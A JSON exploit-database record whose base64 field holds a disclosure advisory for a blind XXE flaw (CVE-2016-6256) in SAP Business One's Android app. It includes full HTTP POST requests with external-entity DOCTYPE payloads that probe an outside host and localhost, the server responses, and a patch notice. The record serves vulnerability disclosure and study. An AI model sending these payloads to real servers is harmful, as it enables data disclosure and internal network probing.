{
    "source": "exploit-database", 
    "exploit": "77u/RXhwbG9pdCBUaXRsZTogQmxpbmQgWFhFIChYTUwgRXh0ZXJuYWwgRW50aXR5KWluIFNBUA0KRGF0ZSBvZiBEaXNjbG9zdXJlOiAxNy8wNS8yMDE3DQpBdXRob3I6IFJhdmluZHJhIFNpbmdoIFJhdGhvcmUNClZlbmRvciBIb21lcGFnZTogaHR0cHM6Ly93d3cuc2FwLmNvbS9wcm9kdWN0cy9idXNpbmVzcy1vbmUuaHRtbA0KUHJvZHVjdCAtIFNBUCBCdXNpbmVzcyBPbmUgQW5kcm9pZCBBcHBsaWNhdGlvbg0KVmVyc2lvbiAtIDEuMi4zDQpTZWN1cml0eSBOb3RlOiAyMzc4MDY1DQpDVkUgLSBDVkUtMjAxNi02MjU2DQpDVlNTIC0gNi41IA0KDQpYWEUgLSBBbiBYTUwgRXh0ZXJuYWwgRW50aXR5KFhYRSkgYXR0YWNrIGlzIGEgdHlwZSBvZiBhdHRhY2sgYWdhaW5zdCBhbiBhcHBsaWNhdGlvbiB0aGF0IHBhcnNlcyBYTUwgaW5wdXQuIFRoaXMgYXR0YWNrIG9jY3VycyB3aGVuIFhNTCBpbnB1dCBjb250YWluaW5nIGEgcmVmZXJlbmNlIHRvIGFuIGV4dGVybmFsIGVudGl0eSBpcyBwcm9jZXNzZWQgYnkgYSB3ZWFrbHkgY29uZmlndXJlZCBYTUwgcGFyc2VyLiBUaGlzIGF0dGFjayBtYXkgbGVhZCB0byB0aGUgZGlzY2xvc3VyZSBvZiBjb25maWRlbnRpYWwgZGF0YSwgZGVuaWFsIG9mIHNlcnZpY2UsIHNlcnZlciBzaWRlIHJlcXVlc3QgZm9yZ2VyeSwgcG9ydCBzY2FubmluZyBmcm9tIHRoZSBwZXJzcGVjdGl2ZSBvZiB0aGUgbWFjaGluZSB3aGVyZSB0aGUgcGFyc2VyIGlzIGxvY2F0ZWQsIGFuZCBvdGhlciBzeXN0ZW0gaW1wYWN0cy4NCg0KU0FQIEJ1c2luZXNzIE9uZSBBbmRyb2lkIEFwcGxpY2F0aW9uIGlzIHZ1bG5lcmFibGUgdG8gWFhFLiBBIHJlbW90ZSBhdHRhY2tlciBjb3VsZCBleHBsb2l0IHRoaXMgdnVsbmVyYWJpbGl0eSB0byBleHBvc2UgaGlnaGx5IHNlbnNpdGl2ZSBpbmZvcm1hdGlvbiBmcm9tIHNlcnZlcnMuDQoNCg0KMSkgSFRUUCBSZXF1ZXN0IFJlc3BvbnNlDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpQT1NUIC9CMWlYY2VsbGVyYXRvci9leGVjL3NvYXAvdlAuMDAxc2FwMDAwMy5pbl9XQ1NYL2NvbS5zYXAuYjFpLnZwbGF0Zm9ybS5ydW50aW1lL0lOQl9XU19DQUxMX1NZTkNfWFBUL0lOQl9XU19DQUxMX1NZTkNfWFBULmlwby9wcm9jIEhUVFAvMS4xDQpDb250ZW50LVR5cGU6IHRleHQveG1sOyBjaGFyc2V0PVVURi04DQpVc2VyLUFnZW50OiBEYWx2aWsvMS42LjAgKExpbnV4OyBVOyBBbmRyb2lkIDQuMi4yOyBDdXN0b20gVGFibGV0IC0gNC4yLjIgLSBBUEkgMTcgLSAyNTYweDE2MDAgQnVpbGQvSkRRMzlFKSBCMU1vYmlsZS8xLjIuMw0KSG9zdDogYjFobW9iaWxlLnRkYy5zYXAuY29tOjg0NDMNCkNvbm5lY3Rpb246IGNsb3NlDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXANCkNvb2tpZTogSlNFU1NJT05JRD0xMzk0NkY2Q0ZDQkI2RkUxRjJENTE1MDg3RkIwOEZGMzsgSlNFU1NJT05JRD0xMzk0NkY2Q0ZDQkI2RkUxRjJENTE1MDg3RkIwOEZGMw0KQ29udGVudC1MZW5ndGg6IDQ5Mw0KDQo8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcgPz4gPCFET0NUWVBFIGZvbyBbICANCiAgIDwhRUxFTUVOVCBmb28gQU5ZID4NCiAgIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHBzOi8vbGl2ZS5jb20iID5dPjxzb2FwOkVudmVsb3BlIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhtbG5zOnhzZD0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEiIHhtbG5zOnNvYXA9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3NvYXAvZW52ZWxvcGUvIj48c29hcDpCb2R5PjxHZXRSZWNlbnRBY3Rpdml0eSB4bWxucz0iaHR0cDovL3RlbXB1cmkub3JnLyI+PEVuZFRpbWU+MjAxNi0wNi0zMCAyMzo1OTwvRW5kVGltZT48U3RhcnRUaW1lPjIwMTYtMDYtMDEgMDA6MDA8L1N0YXJ0VGltZT48Zm9vPiZ4eGU7PC9mb28+PC9HZXRSZWNlbnRBY3Rpdml0eT48L3NvYXA6Qm9keT48L3NvYXA6RW52ZWxvcGU+DQoNCg0KDQoNCkhUVFAvMS4xIDUwMCBJbnRlcm5hbCBTZXJ2ZXIgRXJyb3INCkRhdGU6IFdlZCwgMTggTWF5IDIwMTYgMDc6MDE6MzMgR01UDQpTZXJ2ZXI6IA0KWC1GUkFNRS1PUFRJT05TOiBTQU1FT1JJR0lODQpFeHBpcmVzOiBUaHUsIDAxIEphbiAxOTcwIDAwOjAwOjAwIEdNVA0KQ29udGVudC1UeXBlOiB0ZXh0L3htbA0KQ29udGVudC1MZW5ndGg6IDU1NjYNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9IlVURi04Ij8+DQo8U09BUC1FTlY6RW52ZWxvcGUgeG1sbnM6U09BUC1FTlY9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3NvYXAvZW52ZWxvcGUvIj48U09BUC1FTlY6Qm9keT48U09BUC1FTlY6RmF1bHQ+PGZhdWx0Y29kZT5TT0FQLUVOVjpTZXJ2ZXI8L2ZhdWx0Y29kZT48ZmF1bHRzdHJpbmc+U2VydmVyIEVycm9yPC9mYXVsdHN0cmluZz48ZGV0YWlsPjx4Y2k6cmVhc29uIHhtbG5zOnhjaT0idXJuOmNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yOmludGRvYyI+Q29ubmVjdGlvbiB0aW1lZCBvdXQ6IGNvbm5lY3Q8L3hjaTpyZWFzb24+PHhjaTp0aWQgeG1sbnM6eGNpPSJ1cm46Y29tLnNhcC5iMWkueGNlbGxlcmF0b3I6aW50ZG9jIj4xNjA1MTgwODQ3MzAwNzk1NTM3NkFDMTA2Qjk3MjgyMzwveGNpOnRpZD48eGNpOmV4Y2VwdGlvbiB4bWxuczp4Y2k9InVybjpjb20uc2FwLmIxaS54Y2VsbGVyYXRvcjppbnRkb2MiPmNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLlhjZWxsZXJhdG9yRXhjZXB0aW9uOiBYQ0UwMDEgTmVzdGVkIGV4Y2VwdGlvbjoNCmNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLlhjZWxsZXJhdG9yRXhjZXB0aW9uOiBYQ0UwMDEgTmVzdGVkIGV4Y2VwdGlvbjoNCmNvbS5zYXAuYjFpLnV0aWxpdGllcy5VdGlsRXhjZXB0aW9uOiBVVEUwMDEgTmVzdGVkIGV4Y2VwdGlvbjogamF2YXgueG1sLnRyYW5zZm9ybS5UcmFuc2Zvcm1lckV4Y2VwdGlvbjogY29tLnN1bi5vcmcuYXBhY2hlLnhtbC5pbnRlcm5hbC51dGlscy5XcmFwcGVkUnVudGltZUV4Y2VwdGlvbjogQ29ubmVjdGlvbiB0aW1lZCBvdXQ6IGNvbm5lY3Q8L3hjaTpleGNlcHRpb24+PHhjaTpjYWxsU3RhY2sgeG1sbnM6eGNpPSJ1cm46Y29tLnNhcC5iMWkueGNlbGxlcmF0b3I6aW50ZG9jIj5jb20uc2FwLmIxaS54Y2VsbGVyYXRvci5YY2VsbGVyYXRvckV4Y2VwdGlvbjogWENFMDAxIE5lc3RlZCBleGNlcHRpb246DQpjb20uc2FwLmIxaS54Y2VsbGVyYXRvci5YY2VsbGVyYXRvckV4Y2VwdGlvbjogWENFMDAxIE5lc3RlZCBleGNlcHRpb246DQpjb20uc2FwLmIxaS51dGlsaXRpZXMuVXRpbEV4Y2VwdGlvbjogVVRFMDAxIE5lc3RlZCBleGNlcHRpb246IGphdmF4LnhtbC50cmFuc2Zvcm0uVHJhbnNmb3JtZXJFeGNlcHRpb246IGNvbS5zdW4ub3JnLmFwYWNoZS54bWwuaW50ZXJuYWwudXRpbHMuV3JhcHBlZFJ1bnRpbWVFeGNlcHRpb246IENvbm5lY3Rpb24gdGltZWQgb3V0OiBjb25uZWN0DQoJYXQgY29tLnNhcC5iMWkueGNlbGxlcmF0b3IuSVBPV29ya1Jlc291cmNlLmV4ZWN1dGUoSVBPV29ya1Jlc291cmNlLmphdmE6NTI3KQ0KCWF0IGNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLklQT1N0ZXBJbnN0YW5jZS5leGVjdXRlSW5uZXIoSVBPU3RlcEluc3RhbmNlLmphdmE6NjgzKQ0KCWF0IGNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLklQT1N0ZXBJbnN0YW5jZS5leGVjdXRlT3V0ZXIoSVBPU3RlcEluc3RhbmNlLmphdmE6NTE4KQ0KCWF0IGNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLlhjZWxsZXJhdG9yLnRyaWdnZXIoWGNlbGxlcmF0b3IuamF2YToxNDIyKQ0KCWF0IGNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLlNpbmdsZUFkYXB0ZXJQb29sLnRyaWdnZXIoU2luZ2xlQWRhcHRlclBvb2wuamF2YTo0NjIpDQoJYXQgY29tLnNhcC5iMWkueGNlbGxlcmF0b3IuQWN0aXZlTGlzdGVuZXJJbnRlcmFjdG9yLnRyaWdnZXIyKEFjdGl2ZUxpc3RlbmVySW50ZXJhY3Rvci5qYXZhOjE5MSkNCglhdCBjb20uc2FwLmIxaS54Y2xfd3Nhci5XU0FSTGlzdGVuZXIuZXhlY3V0ZVdTQXgoV1NBUkxpc3RlbmVyLmphdmE6MjE5KQ0KCWF0IGNvbS5zYXAuYjFpLnhjbF93c2FyLldTQVJMaXN0ZW5lci5oYW5kbGVXUyhXU0FSTGlzdGVuZXIuamF2YToxNTYpDQoJYXQgY29tLnNhcC5iMWkueGNsX2h0dHAuSFRUUExpc3RlbmVyLl9kb1h4eChIVFRQTGlzdGVuZXIuamF2YToxNTA0KQ0KCWF0IGNvbS5zYXAuYjFpLnhjbF9odHRwLkhUVFBMaXN0ZW5lci5fZG9Qb3N0KEhUVFBMaXN0ZW5lci5qYXZhOjE0MDUpDQoJYXQgY29tLnNhcC5iMWkueGNsX2h0dHAuSFRUUExpc3RlbmVyLnNlcnZpY2UoSFRUUExpc3RlbmVyLmphdmE6ODA1KQ0KCWF0IGphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldC5zZXJ2aWNlKEh0dHBTZXJ2bGV0LmphdmE6NzIzKQ0KCWF0IG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNoYWluLmludGVybmFsRG9GaWx0ZXIoQXBwbGljYXRpb25GaWx0ZXJDaGFpbi5qYXZhOjI5MCkNCglhdCBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuQXBwbGljYXRpb25GaWx0ZXJDaGFpbi5kb0ZpbHRlcihBcHBsaWNhdGlvbkZpbHRlckNoYWluLmphdmE6MjA2KQ0KCWF0IG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5TdGFuZGFyZFdyYXBwZXJWYWx2ZS5pbnZva2UoU3RhbmRhcmRXcmFwcGVyVmFsdmUuamF2YToyMzMpDQoJYXQgb3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLlN0YW5kYXJkQ29udGV4dFZhbHZlLmludm9rZShTdGFuZGFyZENvbnRleHRWYWx2ZS5qYXZhOjE5MSkNCglhdCBvcmcuYXBhY2hlLmNhdGFsaW5hLmF1dGhlbnRpY2F0b3IuQXV0aGVudGljYXRvckJhc2UuaW52b2tlKEF1dGhlbnRpY2F0b3JCYXNlLmphdmE6NTYzKQ0KCWF0IG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5TdGFuZGFyZEhvc3RWYWx2ZS5pbnZva2UoU3RhbmRhcmRIb3N0VmFsdmUuamF2YToxMjcpDQoJYXQgb3JnLmFwYWNoZS5jYXRhbGluYS52YWx2ZXMuRXJyb3JSZXBvcnRWYWx2ZS5pbnZva2UoRXJyb3JSZXBvcnRWYWx2ZS5qYXZhOjEwMykNCglhdCBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuU3RhbmRhcmRFbmdpbmVWYWx2ZS5pbnZva2UoU3RhbmRhcmRFbmdpbmVWYWx2ZS5qYXZhOjEwOSkNCglhdCBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvbm5lY3Rvci5Db3lvdGVBZGFwdGVyLnNlcnZpY2UoQ295b3RlQWRhcHRlci5qYXZhOjI5MykNCglhdCBvcmcuYXBhY2hlLmNveW90ZS5odHRwMTEuSHR0cDExUHJvY2Vzc29yLnByb2Nlc3MoSHR0cDExUHJvY2Vzc29yLmphdmE6ODYxKQ0KCWF0IG9yZy5hcGFjaGUuY295b3RlLmh0dHAxMS5IdHRwMTFQcm90b2NvbCRIdHRwMTFDb25uZWN0aW9uSGFuZGxlci5wcm9jZXNzKEh0dHAxMVByb3RvY29sLmphdmE6NjA2KQ0KCWF0IG9yZy5hcGFjaGUudG9tY2F0LnV0aWwubmV0LkpJb0VuZHBvaW50JFdvcmtlci5ydW4oSklvRW5kcG9pbnQuamF2YTo0ODkpDQoJYXQgamF2YS5sYW5nLlRocmVhZC5ydW4oVGhyZWFkLmphdmE6ODEyKQ0KQ2F1c2VkIGJ5OiBjb20uc2FwLmIxaS54Y2VsbGVyYXRvci5YY2VsbGVyYXRvckV4Y2VwdGlvbjogWENFMDAxIE5lc3RlZCBleGNlcHRpb246DQpjb20uc2FwLmIxaS51dGlsaXRpZXMuVXRpbEV4Y2VwdGlvbjogVVRFMDAxIE5lc3RlZCBleGNlcHRpb246IGphdmF4LnhtbC50cmFuc2Zvcm0uVHJhbnNmb3JtZXJFeGNlcHRpb246IGNvbS5zdW4ub3JnLmFwYWNoZS54bWwuaW50ZXJuYWwudXRpbHMuV3JhcHBlZFJ1bnRpbWVFeGNlcHRpb246IENvbm5lY3Rpb24gdGltZWQgb3V0OiBjb25uZWN0DQoJYXQgY29tLnNhcC5iMWkueGNsX3dzYXIuV1NBUkFkYXB0ZXIuZ2V0KFdTQVJBZGFwdGVyLmphdmE6Mjk1KQ0KCWF0IGNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLklQT1N0ZXBJbnN0YW5jZS5oYW5kbGVJTyhJUE9TdGVwSW5zdGFuY2UuamF2YToxMzkxKQ0KCWF0IGNvbS5zYXAuYjFpLnhjZWxsZXJhdG9yLklQT1N0ZXBJbnN0YW5jZS5leGVjdXRlVHJhbnNhY3Rpb24oSVBPU3RlcEluc3RhbmNlLmphdmE6MTA1MCkNCglhdCBjb20uc2FwLmIxaS54Y2VsbGVyYXRvci5JUE9Xb3JrUmVzb3VyY2UuZXhlY3V0ZShJUE9Xb3JrUmVzb3VyY2UuamF2YTo0MjUpDQoJLi4uIDI0IG1vcmUNCkNhdXNlZCBieTogY29tLnNhcC5iMWkudXRpbGl0aWVzLlV0aWxFeGNlcHRpb246IFVURTAwMSBOZXN0ZWQgZXhjZXB0aW9uOiBqYXZheC54bWwudHJhbnNmb3JtLlRyYW5zZm9ybWVyRXhjZXB0aW9uOiBjb20uc3VuLm9yZy5hcGFjaGUueG1sLmludGVybmFsLnV0aWxzLldyYXBwZWRSdW50aW1lRXhjZXB0aW9uOiBDb25uZWN0aW9uIHRpbWVkIG91dDogY29ubmVjdA0KCWF0IGNvbS5zYXAuYjFpLnV0aWxpdGllcy5YTUxIYW5kbGVyJERvY3VtZW50TWFuaXB1bGF0b3IudHJhbnNmb3JtU291cmNlMlJlc3VsdChYTUxIYW5kbGVyLmphdmE6MjcyKQ0KCWF0IGNvbS5zYXAuYjFpLnV0aWxpdGllcy5TQVhEb2MyUGFzcy5wcm9jZXNzKFNBWERvYzJQYXNzLmphdmE6MTIxKQ0KCWF0IGNvbS5zYXAuYjFpLnV0aWxpdGllcy5TQVhEb2NTcGxpdHRlci5wcm9jZXNzKFNBWERvY1NwbGl0dGVyLmphdmE6MTQpDQoJYXQgY29tLnNhcC5iMWkueGNsX3dzYXIuV1NBUkFkYXB0ZXIuZ2V0KFdTQVJBZGFwdGVyLmphdmE6MjU1KQ0KCS4uLiAyNyBtb3JlDQpDYXVzZWQgYnk6IGphdmF4LnhtbC50cmFuc2Zvcm0uVHJhbnNmb3JtZXJFeGNlcHRpb246IGNvbS5zdW4ub3JnLmFwYWNoZS54bWwuaW50ZXJuYWwudXRpbHMuV3JhcHBlZFJ1bnRpbWVFeGNlcHRpb246IENvbm5lY3Rpb24gdGltZWQgb3V0OiBjb25uZWN0DQoJYXQgY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVHJhbnNmb3JtZXJJbXBsLmdldERPTShUcmFuc2Zvcm1lckltcGwuamF2YTo1ODQpDQoJYXQgY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVHJhbnNmb3JtZXJJbXBsLnRyYW5zZm9ybShUcmFuc2Zvcm1lckltcGwuamF2YTo3NDUpDQoJYXQgY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVHJhbnNmb3JtZXJJbXBsLnRyYW5zZm9ybShUcmFuc2Zvcm1lckltcGwuamF2YTozNTcpDQoJYXQgY29tLnNhcC5iMWkudXRpbGl0aWVzLlhNTEhhbmRsZXIkRG9jdW1lbnRNYW5pcHVsYXRvci50cmFuc2Zvcm1Tb3VyY2UyUmVzdWx0KFhNTEhhbmRsZXIuamF2YToyNjQpDQoJLi4uIDMwIG1vcmUNCkNhdXNlZCBieTogY29tLnN1bi5vcmcuYXBhY2hlLnhtbC5pbnRlcm5hbC51dGlscy5XcmFwcGVkUnVudGltZUV4Y2VwdGlvbjogQ29ubmVjdGlvbiB0aW1lZCBvdXQ6IGNvbm5lY3QNCglhdCBjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMuZG9tLlhTTFRDRFRNTWFuYWdlci5nZXREVE0oWFNMVENEVE1NYW5hZ2VyLmphdmE6NDI3KQ0KCWF0IGNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy5kb20uWFNMVENEVE1NYW5hZ2VyLmdldERUTShYU0xUQ0RUTU1hbmFnZXIuamF2YToyMTUpDQoJYXQgY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVHJhbnNmb3JtZXJJbXBsLmdldERPTShUcmFuc2Zvcm1lckltcGwuamF2YTo1NjIpDQoJLi4uIDMzIG1vcmUNCjwveGNpOmNhbGxTdGFjaz48eGNpOnJldHJ5TGF0ZXIgeG1sbnM6eGNpPSJ1cm46Y29tLnNhcC5iMWkueGNlbGxlcmF0b3I6aW50ZG9jIj5mYWxzZTwveGNpOnJldHJ5TGF0ZXI+PC9kZXRhaWw+PC9TT0FQLUVOVjpGYXVsdD48L1NPQVAtRU5WOkJvZHk+PC9TT0FQLUVOVjpFbnZlbG9wZT4NCg0KDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQoNCjIpIEhUVFAgUmVxdWVzdCBSZXNwb25zZQ0KKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNClBPU1QgL0IxaVhjZWxsZXJhdG9yL2V4ZWMvc29hcC92UC4wMDFzYXAwMDAzLmluX1dDU1gvY29tLnNhcC5iMWkudnBsYXRmb3JtLnJ1bnRpbWUvSU5CX1dTX0NBTExfU1lOQ19YUFQvSU5CX1dTX0NBTExfU1lOQ19YUFQuaXBvL3Byb2MgSFRUUC8xLjENCkNvbnRlbnQtVHlwZTogdGV4dC94bWw7IGNoYXJzZXQ9VVRGLTgNClVzZXItQWdlbnQ6IERhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4yLjI7IEN1c3RvbSBUYWJsZXQgLSA0LjIuMiAtIEFQSSAxNyAtIDI1NjB4MTYwMCBCdWlsZC9KRFEzOUUpIEIxTW9iaWxlLzEuMi4zDQpIb3N0OiBiMWhtb2JpbGUudGRjLnNhcC5jb206ODQ0Mw0KQ29ubmVjdGlvbjogY2xvc2UNCkFjY2VwdC1FbmNvZGluZzogZ3ppcA0KQ29va2llOiBKU0VTU0lPTklEPTM5NzRBRTcyNTVENkMxNUVCMDU0NkE5MDNERjQ3NEFDOyBKU0VTU0lPTklEPTM5NzRBRTcyNTVENkMxNUVCMDU0NkE5MDNERjQ3NEFDDQpDb250ZW50LUxlbmd0aDogNDk4DQoNCjw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9J1VURi04JyA/PiA8IURPQ1RZUEUgZm9vIFsgIA0KICAgPCFFTEVNRU5UIGZvbyBBTlkgPg0KICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAiaHR0cDovLzEyNy4wLjAuMTo4MDgwIiA+XT48c29hcDpFbnZlbG9wZSB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczpzb2FwPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+PHNvYXA6Qm9keT48R2V0UmVjZW50QWN0aXZpdHkgeG1sbnM9Imh0dHA6Ly90ZW1wdXJpLm9yZy8iPjxFbmRUaW1lPjIwMTYtMDYtMzAgMjM6NTk8L0VuZFRpbWU+PFN0YXJ0VGltZT4yMDE2LTA2LTAxIDAwOjAwPC9TdGFydFRpbWU+PGZvbz4meHhlOzwvZm9vPjwvR2V0UmVjZW50QWN0aXZpdHk+PC9zb2FwOkJvZHk+PC9zb2FwOkVudmVsb3BlPg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KSFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDE1IEp1biAyMDE2IDEwOjE5OjQ0IEdNVA0KU2VydmVyOiANClgtRlJBTUUtT1BUSU9OUzogU0FNRU9SSUdJTg0KRXhwaXJlczogVGh1LCAwMSBKYW4gMTk3MCAwMDowMDowMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC94bWw7Y2hhcnNldD1VVEYtOA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA5Njg5DQoNCjw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9IlVURi04Ij8+DQo8U09BUC1FTlY6RW52ZWxvcGUgeG1sbnM6U09BUC1FTlY9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3NvYXAvZW52ZWxvcGUvIj48U09BUC1FTlY6Qm9keT4NCjxHZXRSZWNlbnRBY3Rpdml0eVJlc3BvbnNlIHhtbG5zPSJodHRwOi8vdGVtcHVyaS5vcmcvIj4NCiAgICAgICAgPEdldFJlY2VudEFjdGl2aXR5UmVzdWx0Plt7Ik51bWJlciI6IjIzNTIiLCJSZW1hcmtzIjoiU2FsZXMgZGlzY291bnRzIiwiU3RhcnREYXRlVGltZSI6IjIwMTYtMDYtMDEgMDY6NDAiLCJBY3Rpdml0eSI6IkMiLCJFbmREYXRlVGltZSI6IjIwMTYtMDYtMDEgMDY6NTUiLCJPcmdhbml6ZXIiOiJUb20gTW9iaWxlIiwiQ25jdFBlcnNvbiI6IkRhbmllbCBCcm93biIsIlN0YXR1cyI6IiIsIlJlbWluZGVyIjoiTiIsIlJlbVF0eSI6IjE1LjAwMDAwMCIsIlJlbVR5cGUiOiJNIiwiTm90ZXMiOiIifSx7Ik51bWJlciI6IjIzOTAiLCJSZW1hcmtzIjoiU2FsZXMgcGxhbm5pbmciLCJTdGFydERhdGVUaW1lIjoiMjAxNi0wNi0xNyAwNjo0MCIsIkFjdGl2aXR5IjoiTSIsIkVuZERhdGVUaW1lIjoiMjAxNi0wNi0xNyAwNjo1NSIsIk9yZ2FuaXplciI6IlRvbSBNb2JpbGUiLCJDbmN0UGVyc29uIjoiQm9iIE1jS2Vuc2x5IiwiU3RhdHVzIjoiIiwiUmVtaW5kZXIiOiJOIiwiUmVtUXR5IjoiMTUuMDAwMDAwIiwiUmVtVHlwZSI6Ik0iLCJOb3RlcyI6IiJ9XTwvR2V0UmVjZW50QWN0aXZpdHlSZXN1bHQ+DQogICAgICA8L0dldFJlY2VudEFjdGl2aXR5UmVzcG9uc2U+PC9TT0FQLUVOVjpCb2R5PjwvU09BUC1FTlY6RW52ZWxvcGU+DQoNCg0KDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpTb2x1dGlvbjoNClNBUCBoYXMgcmVsZWFzZWQgcGF0Y2ggb24gMTMvMTIvMjAxNg0KwqANCg0KIyMgQ3JlZGl0cw0KwqAqIFJhdmluZHJhIFNpbmdoIFJhdGhvcmUgDQogKiBodHRwczovL2luLmxpbmtlZGluLmNvbS9pbi9yYXZpbmRyYS1zaW5naC1yYXRob3JlLThhYTg5MjM2DQogKiBodHRwczovL3R3aXR0ZXIuY29tL3JhdmluZHJhX2hhY2tz", 
    "filename": "platforms/xml/webapps/42036.txt", 
    "id": "42036", 
    "cves": [
        "CVE-2016-6256"
    ]
}